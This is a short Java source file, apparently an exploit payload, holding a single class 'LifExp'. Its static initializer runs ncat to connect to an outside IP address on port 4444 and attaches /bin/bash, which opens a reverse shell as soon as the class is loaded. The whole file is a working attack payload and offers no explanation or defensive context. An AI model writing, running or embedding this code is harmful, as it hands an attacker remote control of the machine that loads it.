public class LifExp {

static {
try {
String[] cmd = {"ncat", "103.130.218.210", "4444", "-e", "/bin/bash"};
//String cmd = "ncat 103.130.218.210 4444 -e /bin/bash";
java.lang.Runtime.getRuntime().exec(cmd).waitFor();
} catch ( Exception e ) {
e.printStackTrace();
}
}
}
